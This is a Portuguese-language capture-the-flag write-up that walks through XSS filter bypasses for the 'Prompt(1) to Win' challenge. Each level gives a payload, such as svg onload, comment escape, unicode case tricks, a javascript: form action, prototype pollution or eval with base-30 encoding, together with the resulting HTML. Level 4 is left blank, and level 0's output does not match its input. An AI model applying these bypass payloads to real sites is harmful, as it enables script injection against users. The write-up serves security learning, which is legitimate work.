# Prompt(1) to Win
###### Solved by @joaoselim
>This challenge is about XSS, JavaScript, Injeção de Código
## About the challenge
Nesse desafio de XSS(Cross-Site Scripting) temos o objetivo de realizar diversas injeções de código JavaScript, para chamar prompt(1) através de 15 níveis diferentes

## Solutions
#### Desafio 0:

[![questao0.png](https://i.postimg.cc/W4g2WgjP/questao0.png)](https://postimg.cc/kVM3DVBj)

Input:
```
"><script>prompt(1)</script>
```
Nesse primeiro caso temos um código simples, sem filtragem, oque devemos nos atentar é em sair do atributo `value="` usando `"`, e encerrar a tag `input` usando `/>`. A partir daí
inserimos nosso script `<script>prompt(1)</script>`

HTML Source:
```
<input type="text" value=""><script>alert(1)</script>">
```

#### Desafio 1:

[![questao1.png](https://i.postimg.cc/cL9SFhPj/questao1.png)](https://postimg.cc/jD7m5HxQ)

Input:
```
<svg/ onload=prompt(1) 
```
Seguido de uma quebra de linha ou espaço.

Agora começamos a ter que contornar tipos de filtragem. Nessa questão a regex `/<\/?[^>]+>/gi` faz com que ao inserirmos qualquer informação em uma tag HTML encerrada por `>` será 
substituido no código por `''`, para isso, abrimos o construtor `<` e fornecemos um tipo de imagem svg, e usamos uma `/` para que ocorra uma quebra no formato da tag, em seguida afirmamos para o código 
usando o `onload` que ao carregar a imagem deve chamar `prompt(1)`

HTML Source:
```
<article><svg/ onload=prompt(1)
</article>
```

#### Desafio 2:

[![questao2.png](https://i.postimg.cc/13hHLVNK/questao2.png)](https://postimg.cc/zV7KhB7L)

Input:
```
<svg><script>prompt&#40;1)</script>
```
Ainda lidando com filtragem, agora não podemos usar nem `=` nem `(`, ent para isso tem se conhecimento que todas as teclas de um teclado tem um código correspondente, no caso do `(` é `&#40`. Iniciamos nosso input abrindo a tag `<svg>`, concluimos colocando um script dentro dela `<script></script>` e chamando o prompt(1) dentro da tag script

HTML Source:
```
<svg><script>prompt&#40;1)</script>
```

#### Desafio 3:

[![questao3.png](https://i.postimg.cc/yx6bwggd/questao3.png)](https://postimg.cc/9RSb9fB5)

Input:
```
--!><svg onload=prompt(1)
```
Nessa questão nosso input está sendo colocado dentro de `<!--...-->`, então tudo que escrevemos é visto pelo código como comentário, então precisamos encerrar a sessão de comentarios.
Para isso é possível usar de 2 formas, `-->` e `--!>`, mas como temos a filtragem de `->` então temos de usar a segunda opção. 
Então seguimos nosso input com um tipo `svg` em que ao ser carregado chama o `prompt(1)`

HTML Source:
```
<!-- --!><svg onload=prompt(1) -->
```

#### Desafio 4:

[![questao4.png](https://i.postimg.cc/nz5tYGwx/questao4.png)](https://postimg.cc/mzQqTCsp)

Input:
```

```
resolução

HTML Source:
```

```

#### Desafio 5:

[![questao5.png](https://i.postimg.cc/R0kkWZ3C/questao5.png)](https://postimg.cc/GBj7NrJ6)

Input:
```
"type=image src onerror
="prompt(1)
```
Primeiro fechamos as aspas do `value="`, assim oque escrevermos não vai mais ser registrado como valor. Em seguida fornecemos ao código uma imagem falsa, assim o nosso src vai dar como erro. Mas pra conseguirmos burlar o filtro, temos de colocar o `onerror` em uma linha e o `=` em outra.

HTML Source:
```
<input value=""type=image src onerror
="prompt(1)" type="text">
```

#### Desafio 6:

[![questao6.png](https://i.postimg.cc/KvV2CMBj/questao6.png)](https://postimg.cc/svpqh1nC)

Input:
```
javascript:prompt(1)#{"action":1}
```
A entrada de javascript:prompt(1) é aceita por na filtragem só se restringir `script:` ou `data:`, usando `#` com função de split assim preenchendo as partes de acordo:
```
var segments = input.split('#');
var formURL = segments[0];      // "javascript:prompt(1)"
var formData = JSON.parse(segments[1]); // {"action":1}
```
assim definindo javascript:prompt(1) como action

HTML Source:
```
<form action="javascript:prompt(1)" method="post"><input name="action" value="1"></form>                         
<script>                                                  
    // forbid javascript: or vbscript: and data: stuff    
    if (!/script:|data:/i.test(document.forms[0].action)) 
        document.forms[0].submit();                       
    else                                                  
        document.write("Action forbidden.")               
</script>    
```

#### Desafio 7:

[![questao7.png](https://i.postimg.cc/3wm8yZs0/questao7.png)](https://postimg.cc/XZNSm97n)

Input:
```
"><img/src=#"onerror='/*#*/prompt(1)'
```
Nesse desafio se tem um limite de 12 caracteres por linha e se divide a entrada com `#`, com isso temos de montar em partes nosso código.
Então assim como no desafio 5, temos uma imagem com src falso, e para que a atribuição do que se deve fazer ao dar erro não seja atrapalhada, nós comentamos o trecho da linha `<p class="comment" title="` terminando a linha de cima com `/*` e começando a próxima com `*/`

HTML Source:
```
<p class="comment" title=""><img/src="></p>
<p class="comment" title=""onerror='/*"></p>
<p class="comment" title="*/prompt(1)'"></p>
```

#### Desafio 8:

[![questao8.png](https://i.postimg.cc/76M3xX9r/questao8.png)](https://postimg.cc/N9F9D6Zd)

Input:
```
document.getElementById("input").value="\u2028prompt(1)\u2028-->"
```
Nesse desafio tudo oque escrevemos esta dentro de um comentrio, então tudo oque digitamos sai como comentario também. Também temos um filtro que impossibilita alguns formatos de quebra de linha como `\r` e `\n`. Para conseguirmos resolver, nós precisamos abrir o console e nele inserir nosso comando.

Nele primeiro digitamos `document.getElementById("input")` para informar o programa a que parte nosso código será atribuido, através do ID. Em seguida atribuimos um valor, através de `value=`, que será nosso código `"\u2028prompt(1)\u2028-->"`, usamos `\u2028` para quebra de linha, e chamamos nosso prompt(1). Enviando, na nossa área de input fica `prompt(1)-->`, dando um enter entre o prompt(1) e -->

HTML Source:
```
<script>                                    
    // console.log(" prompt(1) -->");        
</script>
```

#### Desafio 9:

[![questao9.png](https://i.postimg.cc/V6Dr6NSD/questao9.png)](https://postimg.cc/Hc8svd9y)

Input:
```
<ſvg/onload=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;>
```
O programa substitui todas as letras minusculas por maiúsculas e toda vez que temos um `<` seguido de uma letra é substituido por um `_`.
Para burlar a troca, usamos de um caracter unicode `ſ`, pois quando ele é substituído por maiúscula ele se transforma em um caracter ASCII equivalente, `s`, assim nós não ficariamos com o `_` podendo gerar nossas tags.

Agora para burlar a troca de maiúscula usamos o código de cada letra necessaria para formar `prompt(1)`

HTML Source:
```
<h1><SVG/ONLOAD=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;></h1>
```

#### Desafio A:

[![questaoA.png](https://i.postimg.cc/0y0v66S5/questaoA.png)](https://postimg.cc/68qggpzF)

Input:
```
p'rompt(1)
```
O código da questão substitui a string `prompt` pela string `alert` e também substitui `'` por `''`, então colocando `'` em qualquer parte da string já não ocorre a troca para alert, e o programa prompt(1) não é afetado pela presença de `'`

HTML Source:
```
<script>prompt(1)</script>
```

#### Desafio B:

[![questaoB.png](https://i.postimg.cc/GmXmjb5Y/questaoB.png)](https://postimg.cc/tsVbqGyC)

Input:
```
"(prompt(1))in"
```
O input passa por uma filtragem em que não é permitido nenhum desses operadores `[|\s+*/\\<>&^:;=~!%-` e então é registrado como nome do usuário em um JSON e então é passado para um script.

usamos um operador como o `in`, assim conseguimos efetivar de uma maneira aceita pelo código nossa chamada de prompt(1), sem ser barrado

HTML Source:
```
<script>                                    
    var data = {"action":"login","message":"Welcome back, "(prompt(1))in"."};          
    if (data.action === "login")            
        document.write(data.message)        
</script>
```

#### Desafio C:

[![questaoC.png](https://i.postimg.cc/XYx7jnKq/questaoC.png)](https://postimg.cc/3k4H95cQ)

Input:
```
eval(630038579..toString(30))(1)
```
O programa realiza uma troca das palavras `prompt` por `alert` então para conseguir driblar isso usamos a função `eval()` já que o código não possui efeito sobre ela. Oque a função faz é converter a string `prompt` criptografada em base 30 `630038579`, para string novamente usando  o `..toString(30)`.

Pode se usar alguma base maior como a 36

HTML Source:
```
<script>eval(630038579..toString(30))(1)</script>
```

#### Desafio D:

[![questaoD.png](https://i.postimg.cc/s2Q9djbd/questaoD.png)](https://postimg.cc/B83120qM)

Input:
```
{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
```


HTML Source:
```
<img src="<img src="onerror=prompt(1)>">
```
